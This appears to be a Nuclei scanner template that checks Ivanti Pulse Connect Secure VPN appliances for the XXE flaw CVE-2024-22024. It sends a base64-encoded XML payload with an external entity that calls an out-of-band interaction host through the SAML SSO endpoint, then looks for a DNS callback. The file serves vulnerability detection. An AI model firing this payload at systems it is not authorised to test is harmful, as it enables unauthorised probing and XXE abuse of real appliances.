id: cve-2024-22024
info:
  name: Ivanti Pulse Connect Secure VPN XXE
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,cve,CVE-2024-22024

variables:
  reverse: '{{interactsh-url}}'
  domain: '{{reverse}}'
  t1: '{{concat("<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY % watchTowr SYSTEM \"http://", domain, "/x\"> %watchTowr;]><r></r>")}}'
  payload: '{{base64(t1)}}'

http:
  - raw:
      - |
        POST /dana-na/auth/saml-sso.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        SAMLRequest={{payload}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "/dana-na/"
          - "WriteCSS"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
